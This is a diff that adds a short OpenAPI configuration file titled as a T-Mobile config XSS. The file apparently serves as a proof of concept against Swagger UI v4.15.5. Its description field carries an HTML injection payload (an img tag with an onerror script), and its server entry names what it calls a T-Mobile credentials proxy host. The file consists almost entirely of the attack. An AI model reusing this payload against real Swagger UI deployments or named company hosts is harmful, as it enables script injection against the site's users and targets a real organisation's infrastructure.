@@ -1,0 +1,15 @@
+{
+  "openapi": "3.0.0",
+  "info": {
+    "title": "T-Mobile API Config XSS",
+    "description": "<img src=x onerror=\"alert('Config XSS in T-Mobile Swagger UI v4.15.5')\">",
+    "version": "1.0.0"
+  },
+  "servers": [
+    {
+      "url": "https://cap-uipa-rpa-proxy.t-mobile.com/api/v1",
+      "description": "T-Mobile Credentials Proxy"
+    }
+  ],
+  "paths": {}
+}
